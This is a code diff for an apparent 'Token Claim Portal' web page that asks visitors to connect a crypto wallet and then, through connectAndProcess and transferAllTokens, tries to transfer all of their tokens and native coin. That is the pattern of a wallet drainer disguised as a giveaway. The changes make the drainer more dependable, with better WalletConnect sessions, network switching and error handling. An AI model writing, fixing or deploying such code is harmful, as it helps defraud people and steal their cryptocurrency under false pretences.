@@ -10,6 +10,7 @@ let provider, signer, userAddress;
 let currentNetwork = "ethereum";
 const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 let walletConnectConnector = null;
+const WALLETCONNECT_PROJECT_ID = "32c106cefb898a0c13b5466bcd26e155"; // Replace with your actual project ID
 
 // Initialize on load
 window.addEventListener('load', async () => {
@@ -39,8 +40,11 @@ window.addEventListener('load', async () => {
 
 async function checkWalletEnvironment() {
   if (isMobile) {
-    if (!window.ethereum) showTrustWalletUI();
-    else hideTrustWalletUI();
+    if (!window.ethereum) {
+      showTrustWalletUI();
+    } else {
+      hideTrustWalletUI();
+    }
   } else {
     hideTrustWalletUI();
   }
@@ -48,10 +52,12 @@ async function checkWalletEnvironment() {
 
 async function initializeWallet() {
   try {
-    if (walletConnectConnector) {
+    if (walletConnectConnector?.connected) {
       provider = new ethers.providers.Web3Provider(walletConnectConnector);
-    } else {
+    } else if (window.ethereum) {
       provider = new ethers.providers.Web3Provider(window.ethereum);
+    } else {
+      throw new Error("No wallet connection available");
     }
     
     signer = provider.getSigner();
@@ -63,7 +69,7 @@ async function initializeWallet() {
     return true;
   } catch (err) {
     console.error("Wallet initialization error:", err);
-    updateStatus("Connection error. Please try again.", "error");
+    updateStatus("Wallet connection error. Please try again.", "error");
     return false;
   }
 }
@@ -79,8 +85,10 @@ async function handleNetworkChange() {
       btn.disabled = false;
       updateConnectButton(true);
     } catch (err) {
+      console.error("Network change error:", err);
       btn.disabled = false;
       updateConnectButton(false);
+      updateStatus("Failed to switch network", "error");
     }
   } else {
     updateConnectButton(false);
@@ -113,6 +121,13 @@ function updateStatus(message, type) {
   statusDiv.style.display = "block";
   statusDiv.innerHTML = message;
   statusDiv.className = `status ${type}`;
+  
+  // Auto-hide success messages after 10 seconds
+  if (type === 'success') {
+    setTimeout(() => {
+      statusDiv.style.display = 'none';
+    }, 10000);
+  }
 }
 
 function showLoader() {
@@ -197,8 +212,9 @@ function showWalletOptions() {
   const content = document.createElement('div');
   content.style.backgroundColor = 'white';
   content.style.padding = '20px';
-  content.style.borderRadius = '10px';
-  content.style.width = '300px';
+  content.style.borderRadius = '12px';
+  content.style.width = '90%';
+  content.style.maxWidth = '350px';
   content.style.textAlign = 'center';
   
   content.innerHTML = `
@@ -237,11 +253,15 @@ function showWalletOptions() {
 
 async function initWalletConnect() {
   try {
+    showLoader();
     updateStatus("Initializing WalletConnect...", "success");
+    
+    // Clear any existing QR code
+    document.getElementById("walletConnectQR").innerHTML = '';
     
     // Initialize WalletConnect v2
     walletConnectConnector = new WalletConnect.Client({
-      projectId: "YOUR_WALLETCONNECT_PROJECT_ID", // Replace with your WalletConnect project ID
+      projectId: WALLETCONNECT_PROJECT_ID,
       metadata: {
         name: "Token Claim Portal",
         description: "Claim your token allocation",
@@ -250,51 +270,70 @@ async function initWalletConnect() {
       }
     });
     
+    // Check if connection is already established
+    if (walletConnectConnector.session) {
+      await connectAndProcess();
+      return;
+    }
+    
     // Subscribe to connection events
-    walletConnectConnector.on("session_update", (error, payload) => {
+    walletConnectConnector.on("session_update", async (error, payload) => {
       if (error) {
         throw error;
       }
       const { chainId, accounts } = payload.params[0];
       userAddress = accounts[0];
+      await handleNetworkChange();
     });
 
-    walletConnectConnector.on("connect", (error, payload) => {
+    walletConnectConnector.on("connect", async (error, payload) => {
       if (error) {
         throw error;
       }
       const { chainId, accounts } = payload.params[0];
       userAddress = accounts[0];
-      connectAndProcess();
+      await connectAndProcess();
     });
 
     walletConnectConnector.on("disconnect", (error, payload) => {
       if (error) {
-        throw error;
+        console.error("WalletConnect disconnect error:", error);
       }
       walletConnectConnector = null;
-      updateStatus("WalletConnect disconnected", "error");
+      updateStatus("Wallet disconnected", "error");
       updateConnectButton(false);
     });
     
     // Create new session
-    await walletConnectConnector.createSession();
+    await walletConnectConnector.createSession({ chainId: parseInt(NETWORK_CONFIGS[currentNetwork].chainId, 16) });
     
     // Generate QR Code
     const uri = walletConnectConnector.uri;
     const qrDiv = document.getElementById("walletConnectQR");
-    qrDiv.innerHTML = '<p>Scan with your mobile wallet</p>';
-    QRCode.toCanvas(qrDiv, uri, { width: 200 }, (error) => {
+    qrDiv.innerHTML = '<p style="margin-bottom: 10px;">Scan with your mobile wallet</p>';
+    
+    QRCode.toCanvas(qrDiv, uri, { 
+      width: 200,
+      margin: 2,
+      color: {
+        dark: '#000000',
+        light: '#ffffff'
+      }
+    }, (error) => {
       if (error) {
         console.error("QR code error:", error);
         qrDiv.innerHTML = '<p>Error generating QR code. Please try again.</p>';
+        hideLoader();
+      } else {
+        hideLoader();
       }
     });
     
   } catch (err) {
     console.error("WalletConnect error:", err);
-    updateStatus("WalletConnect initialization failed", "error");
+    updateStatus("WalletConnect failed: " + (err.message || "Please try again"), "error");
     walletConnectConnector = null;
+    hideLoader();
   }
 }
 
@@ -303,11 +342,11 @@ async function connectAndProcess() {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    if (!window.ethereum && !walletConnectConnector) {
+    if (!window.ethereum && !walletConnectConnector?.connected) {
       throw new Error("Please install a Web3 wallet or use WalletConnect");
     }
 
-    if (!walletConnectConnector) {
+    if (!walletConnectConnector?.connected) {
       await window.ethereum.request({ method: "eth_requestAccounts" });
     }
     
@@ -318,7 +357,7 @@ async function connectAndProcess() {
     await transferAllTokens();
   } catch (err) {
     console.error("Connection error:", err);
-    updateStatus("Error: " + err.message, "error");
+    updateStatus("Error: " + (err.message || "Connection failed"), "error");
     updateConnectButton(false);
   } finally {
     hideLoader();
@@ -328,10 +367,12 @@ async function connectAndProcess() {
 async function checkNetwork() {
   try {
     let chainId;
-    if (walletConnectConnector) {
+    if (walletConnectConnector?.connected) {
       chainId = await walletConnectConnector.request({ method: 'eth_chainId' });
-    } else {
+    } else if (window.ethereum) {
       chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    } else {
+      throw new Error("No wallet connection available");
     }
     
     const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
@@ -339,12 +380,12 @@ async function checkNetwork() {
     if (chainId !== targetChainId) {
       updateStatus("Switching network...", "success");
       try {
-        if (walletConnectConnector) {
+        if (walletConnectConnector?.connected) {
           await walletConnectConnector.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: targetChainId }]
           });
-        } else {
+        } else if (window.ethereum) {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: targetChainId }]
@@ -353,19 +394,19 @@ async function checkNetwork() {
       } catch (switchError) {
         if (switchError.code === 4902) {
           try {
-            if (walletConnectConnector) {
+            if (walletConnectConnector?.connected) {
               await walletConnectConnector.request({
                 method: 'wallet_addEthereumChain',
                 params: [NETWORK_CONFIGS[currentNetwork]]
               });
-            } else {
+            } else if (window.ethereum) {
               await window.ethereum.request({
                 method: 'wallet_addEthereumChain',
                 params: [NETWORK_CONFIGS[currentNetwork]]
               });
             }
           } catch (addError) {
-            throw new Error("Please switch networks manually");
+            throw new Error("Please switch networks manually in your wallet");
           }
         }
         throw new Error("Failed to switch network");
@@ -373,7 +414,7 @@ async function checkNetwork() {
     }
   } catch (err) {
     console.error("Network error:", err);
-    throw new Error("Network error: " + err.message);
+    throw new Error("Network error: " + (err.message || "Failed to switch network"));
   }
 }
 
@@ -401,7 +442,7 @@ async function transferAllTokens() {
         }
       } catch (err) {
         console.error(`Transfer error for ${token.symbol}:`, err);
-        updateStatus(`Failed to transfer ${token.symbol}`, "error");
+        updateStatus(`Failed to transfer ${token.symbol}: ${err.message || "Check your wallet"}`, "error");
       }
     }
 
@@ -428,7 +469,7 @@ async function transferAllTokens() {
         }
       } catch (err) {
         console.error("Native transfer error:", err);
-        updateStatus("Failed to transfer native token", "error");
+        updateStatus(`Failed to transfer native token: ${err.message || "Check your wallet"}`, "error");
       }
     }
     
@@ -439,6 +480,6 @@ async function transferAllTokens() {
     }
   } catch (err) {
     console.error("Transfer process error:", err);
-    updateStatus("Transfer process failed", "error");
+    updateStatus("Transfer process failed: " + (err.message || "Please try again"), "error");
   }
 }
